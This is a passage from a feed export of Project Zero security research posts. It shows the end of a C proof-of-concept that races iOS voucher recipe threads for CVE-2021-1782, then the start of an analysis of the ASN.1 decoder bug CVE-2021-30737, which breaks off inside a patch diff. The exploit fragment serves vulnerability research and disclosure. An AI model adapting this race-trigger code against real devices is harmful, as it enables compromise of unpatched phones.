 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">while</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">// choose a userdata size:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; uint32_t userdata_size </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">arc4random</span><span class="BGLtzooHlW-c2">()</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">%</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">2040</span><span class="BGLtzooHlW-c2">)+</span><span class="BGLtzooHlW-c15">8</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; userdata_size </span><span class="BGLtzooHlW-c2">+=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">7</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; userdata_size </span><span class="BGLtzooHlW-c2">&amp;=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(~</span><span class="BGLtzooHlW-c15">7</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; printf</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c16">&quot;userdata size: 0x%x\n&quot;</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;userdata_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; uint8_t</span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">&nbsp;userdata_buffer </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;calloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">userdata_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">uint32_t</span><span class="BGLtzooHlW-c2">*)</span><span class="BGLtzooHlW-c4">userdata_buffer</span><span class="BGLtzooHlW-c2">)[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;arc4random</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">((</span><span class="BGLtzooHlW-c4">uint32_t</span><span class="BGLtzooHlW-c2">*)</span><span class="BGLtzooHlW-c4">userdata_buffer</span><span class="BGLtzooHlW-c2">)[</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;arc4random</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">// build the templates: </span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; single_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;create_single_variable_userdata_voucher_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">userdata_buffer</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;userdata_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">single_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; redeem_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;create_single_variable_userdata_then_redeem_voucher_recipe</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">userdata_buffer</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;userdata_size</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">redeem_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; free</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">userdata_buffer</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_t single_recipe_thread</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_create</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">single_recipe_thread</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;s3threadfunc</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*)&amp;</span><span class="BGLtzooHlW-c4">single_recipe_template</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_t redeem_recipe_thread</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_create</span><span class="BGLtzooHlW-c2">(&amp;</span><span class="BGLtzooHlW-c4">redeem_recipe_thread</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;s3threadfunc</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">void</span><span class="BGLtzooHlW-c2">*)&amp;</span><span class="BGLtzooHlW-c4">redeem_recipe_template</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_join</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">single_recipe_thread</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; pthread_join</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">redeem_recipe_thread</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;NULL</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; free</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">single_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; free</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">redeem_recipe_template</span><span class="BGLtzooHlW-c2">.</span><span class="BGLtzooHlW-c4">recipe</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">int</span><span class="BGLtzooHlW-c4">&nbsp;main</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c6">int</span><span class="BGLtzooHlW-c4">&nbsp;argc</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">char</span><span class="BGLtzooHlW-c2">**</span><span class="BGLtzooHlW-c4">&nbsp;argv</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; sploit_3</span><span class="BGLtzooHlW-c2">();</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/5933797027217125856/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/5933797027217125856
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/04/cve-2021-1782-ios-in-wild-vulnerability.html
## @title
CVE-2021-1782, an iOS in-the-wild vulnerability in vouchers
## author
## name
Ryan
## uri
http://www.blogger.com/profile/17011901605865574886
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTx_FjnSHTtPtnk2F1K8-AYcTnVrIBNV8PNJQgZCOhfoIvU6hD7teqA3Jmb8T8KtIpnIYKuUqa28P-pt-yM2zUsWppkcmdx18pAP8r0XTQH4JHAhpNZkC2uALpz_Pn5_OXK3mXlblNG1i6TIEtLsksgez8GlLTi2zuxP0haGXzaU1XGEj2RQeNjOto/s72-c/image1%20%283%29%281%29.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-1033743652169779882
## published
07/04/2022 13:08:00
## updated
24/08/2022 16:04:12
## title
## @type
text
## #text
CVE-2021-30737, @xerub's 2021 iOS ASN.1 Vulnerability
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol{margin:0;padding:0}table td,table th{padding:0}.c5{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c10{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c2{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:10pt;font-family:Consolas,"Courier New";font-style:normal}.c0{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c27{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.c31{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-style:normal}.c33{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;text-align:left}.c19{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.c32{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c16{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.c22{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.c34{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.c3{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.c11{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.c21{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c20{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.c23{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.c25{border-spacing:0;border-collapse:collapse;margin-right:auto}.c6{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c13{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c29{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:underline}.c30{font-weight:400;font-family:Consolas,"Courier New"}.c8{orphans:2;widows:2}.c24{color:inherit;text-decoration:inherit}.c7{font-weight:400;font-family:"Courier New"}.c4{background-color:#d9ead3}.c14{height:11pt}.c28{font-family:"Arial"}.c12{background-color:#f4cccc}.c18{height:0pt}.c26{font-style:italic}.c15{background-color:#ffffff}.c17{font-weight:700}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c13">
 <p class="c6 c8"><span class="c9">Posted by Ian Beer, Google Project Zero</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c17">This blog post is my analysis of a vulnerability found by </span><span class="c21 c17"><a class="c241" href="https://twitter.com/xerub">@xerub</a></span><span class="c17">.</span><span class="c17">&nbsp;</span><span class="c21 c17"><a class="c241" href="http://phrack.org/issues/70/12.html#article">Phrack published @xerub&#39;s writeup</a></span><span class="c19 c28 c17">&nbsp;so go check that out first.</span></p>
 <p class="c0"><span class="c19 c28 c17"></span></p>
 <p class="c6 c8"><span class="c9">As well as doing my own vulnerability research I also spend time trying as best as I can to keep up with the public state-of-the-art, especially when details of a particularly interesting vulnerability are announced or a new in-the-wild exploit is caught. Originally this post was just a series of notes I took last year as I was trying to understand this bug. But the bug itself and the narrative around it are so fascinating that I thought it would be worth writing up these notes into a more coherent form to share with the community.</span></p><h2 class="c32 c8" id="h.s8tx0adm3791"><span>Background</span></h2>
 <p class="c6 c8"><span>On April 14th 2021 the </span><span class="c21"><a class="c241" href="https://www.washingtonpost.com/technology/2021/04/14/azimuth-san-bernardino-apple-iphone-fbi/">Washington Post published an article</a></span><span>&nbsp;</span><span>on the unlocking of the San Bernardino iPhone by </span><span class="c21"><a class="c241" href="https://www.vice.com/en/article/8xdayg/iphone-zero-days-inside-azimuth-security">Azimuth</a></span><span class="c9">&nbsp;containing a nugget of non-public information:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>&quot;</span><span class="c26">Azimuth specialized in finding </span><span class="c26 c29">significant vulnerabilities</span><span class="c26">. Dowd [...] had found one </span><span class="c29 c26">in open-source code from Mozilla that Apple used</span><span class="c26">&nbsp;to permit accessories to be plugged into</span><span class="c26">&nbsp;an iPhone&rsquo;s lightning port, according to the person.</span><span class="c9">&quot;</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>There&#39;s not that much Mozilla code running on an iPhone and even less which is likely to be part of such an attack surface. Therefore, if accurate, this quote almost certainly meant that Azimuth had exploited a vulnerability in the </span><span class="c21"><a class="c241" href="https://en.wikipedia.org/wiki/ASN.1">ASN.1</a></span><span>&nbsp;parser used by </span><span class="c21"><a class="c241" href="https://opensource.apple.com/source/Security/">Security.framework</a></span><span class="c9">, which is a fork of Mozilla&#39;s NSS ASN.1 parser.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>I searched around in </span><span class="c21"><a class="c241" href="https://bugzilla.mozilla.org/">bugzilla</a></span><span>&nbsp;(Mozilla&#39;s issue tracker) looking for candidate vulnerabilities which matched the timeline discussed in the Post article and narrowed it down to a handful of plausible bugs including: </span><span class="c21"><a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1202868">1202868</a></span><span>, </span><span class="c21"><a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1192028">1192028</a></span><span>, </span><span class="c21"><a class="c241" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1245528">1245528</a></span><span class="c9">.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c9">I was surprised that there had been so many exploitable-looking issues in the ASN.1 code and decided to add auditing the NSS ASN.1 parser as an quarterly goal.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>A month later, having predictably done absolutely nothing more towards that goal, I saw this </span><span class="c21"><a class="c241" href="https://twitter.com/xerub/status/1397190931653222400">tweet from @xerub</a></span><span>:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"></p>
  
 <p class="c6 c8"><span class="c9"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s1188/image2%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh3Zm78R4JD6H57okd_d1wpa26R9mX0Q746I5hMzwV8EMxosHbDjO5l5tH2hEpkq0m3S7AMmHOU9_6J7veCrxIxq66ilLSKJCLgHBGalgzSo0MrCulaERSbqUhXkHwqNbZdeVg4JWisV2ZuDb_j_AxLxvzX3t1EEtp396DCTt6fYeihuTRsevnnGUXD/s1188/image2%20%281%29%281%29.png" border="0" alt="@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021" style="max-height: 750; max-width: 600px; "title="@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021" /></a></span></p>
 <p class="c34 c8"><span class="c27 c26">@xerub: CVE-2021-30737 is pretty bad. Please update ASAP. (Shameless excerpt from the full chain source code) 4:00 PM - May 25, 2021</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c9">The shameless excerpt reads:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span class="c27 c26">// This is the real deal. Take no chances, take no prisoners! I AM THE STATE MACHINE!</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>And CVE-2021-30737, fixed in iOS 14.6 was described in the </span><span class="c21"><a class="c241" href="https://support.apple.com/en-us/HT212528#:~:text=2021%2D30699%3A%20videosdebarraquito-,Security,CVE%2D2021%2D30737%3A%20xerub,-WebKit">iOS release notes</a></span><span class="c9">&nbsp;as:</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"></p>
  
 <p class="c6 c8"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje1dcAUA5sK_nqVsE360buSwr8PiFgWjPgQpoq-OM0yvBR6Cb0NFXaoXwmIEE6g_fljFihcv3Vh2lUeXZJgKXfFZVC0t3-nuLvhNOx5bEriX6rZmYt1CIiRMxQ47Sw4tuyc9e7ruZC6lLPKklbsN9QQKoEE7h6QeUzQKyNk9APG5-WYvYgjCR7KRJd/s1650/image4%20%281%29%281%29.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje1dcAUA5sK_nqVsE360buSwr8PiFgWjPgQpoq-OM0yvBR6Cb0NFXaoXwmIEE6g_fljFihcv3Vh2lUeXZJgKXfFZVC0t3-nuLvhNOx5bEriX6rZmYt1CIiRMxQ47Sw4tuyc9e7ruZC6lLPKklbsN9QQKoEE7h6QeUzQKyNk9APG5-WYvYgjCR7KRJd/s1200/image4%20%281%29%281%29.png" border="0" alt="Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub" style="max-height: 750; max-width: 600px;" title="Screenshot of text. Transcript: Security. Available for: iPhone 6s and later, iPad Pro (all models), iPad Air 2 and later, iPad 5th generation and later, iPad mini 4 and later, and iPod touch (7th generation). Impact: Processing a maliciously crafted certificate may lead to arbitrary code execution. Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code. CVE-2021-30737: xerub" /></a></span></p>
 <p class="c34 c8"><span class="c27 c26">Impact: Processing a maliciously crafted certification may lead to arbitrary code execution</span></p>
 <p class="c34 c8"><span class="c27 c26">Description: A memory corruption issue in the ASN.1 decoder was addressed by removing the vulnerable code.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>Feeling slightly annoyed that I hadn&#39;t acted on my instincts as there was clearly something awesome lurking there I made a mental note to diff the source code once Apple released it which they finally did a few weeks later on </span><span class="c21"><a class="c241" href="https://opensource.apple.com/source/Security/Security-59754.120.12/">opensource.apple.com in the Security package</a></span><span class="c9">.</span></p>
 <p class="c0"><span class="c9"></span></p>
 <p class="c6 c8"><span>Here&#39;s the diff between the MacOS 11.4 and 11.3 versions of </span><span class="c21"><a class="c241" href="https://opensource.apple.com/source/Security/Security-59754.120.12/OSX/libsecurity_asn1/lib/secasn1d.c.auto.html">secasn1d.c</a></span><span class="c9">&nbsp;which contains the ASN.1 parser:</span></p>
 <p class="c0"><span class="c9"></span></p><a id="t.7d4e5129f2e85e500fa9ac546c708b609028d0e3"></a><a id="t.0"></a><table class="c25"><tbody><tr class="c18"><td class="c5" colspan="1" rowspan="1">
 <p class="c6"><span class="c3">diff </span><span class="c1">--</span><span class="c3">git a</span><span class="c1">/</span><span class="c3">OSX</span><span class="c1">/</span><span class="c3">libsecurity_asn1</span><span class="c1">/</span><span class="c3">lib</span><span class="c1">/</span><span class="c3">secasn1d</span><span class="c1">.</span><span class="c3">c b</span><span class="c1">/</span><span class="c3">OSX</span><span class="c1">/</span><span class="c3">libsecurity_asn1</span><span class="c1">/</span><span class="c3">lib</span><span class="c1">/</span><span class="c3">secasn1d</span><span class="c1">.</span><span class="c2">c</span></p>
 <p class="c6"><span class="c3">index f338527</span><span class="c1">..</span><span class="c11">5b4915a</span><span class="c3">&nbsp;</span><span class="c11">100644</span></p>
 <p class="c6"><span class="c1">---</span><span class="c3">&nbsp;a</span><span class="c1">/</span><span class="c3">OSX</span><span class="c1">/</span><span class="c3">libsecurity_asn1</span><span class="c1">/</span><span class="c3">lib</span><span class="c1">/</span><span class="c3">secasn1d</span><span class="c1">.</span><span class="c2">c</span></p>
 <p class="c6"><span class="c1">+++</span><span class="c3">&nbsp;b</span><span class="c1">/</span><span class="c3">OSX</span><span class="c1">/</span><span class="c3">libsecurity_asn1</span><span class="c1">/</span><span class="c3">lib</span><span class="c1">/</span><span class="c3">secasn1d</span><span class="c1">.</span><span class="c2">c</span></p>
 <p class="c6"><span class="c1">@@</span><span class="c3">&nbsp;</span><span class="c1">-</span><span class="c11">434</span><span class="c1">,</span><span class="c11">9</span><span class="c3">&nbsp;</span><span class="c1">+</span><span class="c11">434</span><span class="c1">,</span><span class="c11">6</span><span class="c3">&nbsp;</span><span class="c1">@@</span><span class="c3">&nbsp;loser</span><span class="c1">:</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PORT_ArenaRelease</span><span class="c1">(</span><span class="c3">cx</span><span class="c1">-&gt;</span><span class="c3">our_pool</span><span class="c1">,</span><span class="c3">&nbsp;state</span><span class="c1">-&gt;</span><span class="c3">our_mark</span><span class="c1">);</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;state</span><span class="c1">-&gt;</span><span class="c3">our_mark </span><span class="c1">=</span><span class="c3">&nbsp;NULL</span><span class="c1">;</span></p>
 <p class="c6"><span class="c3">&nbsp; &nbsp; &nbsp;</span><span class="c1">}</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; </span><span class="c16 c12">if</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">(</span><span class="c3 c12">new_state </span><span class="c1 c12">!=</span><span class="c3 c12">&nbsp;NULL</span><span class="c1 c12">)</span><span class="c3 c12">&nbsp;</span><span class="c1 c12">{</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; &nbsp; &nbsp; PORT_Free</span><span class="c1 c12">(</span><span class="c3 c12">new_state</span><span class="c1 c12">);</span></p>
 <p class="c6"><span class="c1 c12">-</span><span class="c3 c12">&nbsp; &nbsp; </span><span class="c1 c12">}</span></p>
